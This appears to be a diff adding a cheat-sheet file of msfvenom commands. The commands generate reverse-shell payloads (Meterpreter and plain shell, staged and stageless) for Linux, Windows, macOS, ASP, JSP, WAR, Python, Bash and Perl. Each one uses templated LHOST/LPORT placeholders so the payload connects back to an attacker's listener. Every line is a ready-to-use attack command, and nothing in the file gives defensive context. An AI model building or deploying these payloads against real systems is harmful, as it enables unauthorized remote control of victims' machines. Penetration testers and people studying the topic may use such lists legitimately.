@@ -1,0 +1,29 @@
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="#{LHOST}" LPORT=#{LPORT} -f elf > shell.elf
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST="#{LHOST}" LPORT=#{LPORT} -f exe > shell.exe
+
+msfvenom -p osx/x86/shell_reverse_tcp LHOST="#{LHOST}" LPORT=#{LPORT} -f macho > shell.macho
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST="#{LHOST}" LPORT=#{LPORT} -f asp > shell.asp
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST="#{LHOST}" LPORT=#{LPORT} -f raw > shell.jsp
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST="#{LHOST}" LPORT=#{LPORT} -f war > shell.war
+
+msfvenom -p cmd/unix/reverse_python LHOST="#{LHOST}" LPORT=#{LPORT} -f raw > shell.py
+
+msfvenom -p cmd/unix/reverse_bash LHOST="#{LHOST}" LPORT=#{LPORT} -f raw > shell.sh
+
+msfvenom -p cmd/unix/reverse_perl LHOST="#{LHOST}" LPORT=#{LPORT} -f raw > shell.pl
+
+# desc: Windows Staged reverse TCP 
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f exe > reverse.exe
+
+# desc: Windows Stageless reverse TCP 
+msfvenom -p windows/shell_reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f exe > reverse.exe
+
+# desc: Linux Staged reverse TCP 
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f elf >reverse.elf
+
+# desc: Linux Stageless reverse TCP 
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f elf >reverse.elf
